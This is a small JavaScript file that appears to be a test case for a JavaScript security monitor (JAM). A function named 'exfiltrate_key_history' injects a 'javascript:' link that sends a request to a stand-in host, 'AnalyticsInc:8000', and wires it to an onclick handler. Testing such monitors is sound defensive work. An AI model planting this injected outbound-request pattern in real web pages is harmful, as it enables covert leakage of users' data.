
JAM.startProfile('load');
function exfiltrate_key_history(){var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=link", true);xmlhttp.send(null);',link=document.createElement("a");link.href="javascript:"+exp;JAMScript.set(link,"innerHTML","Suspicious Link");link.id="mylink";exp=document.getElementsByTagName("body");exp=exp[0];JAMScript.call(exp.appendChild,exp,[link])}var v1=document.getElementById("test");JAMScript.set(v1,"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
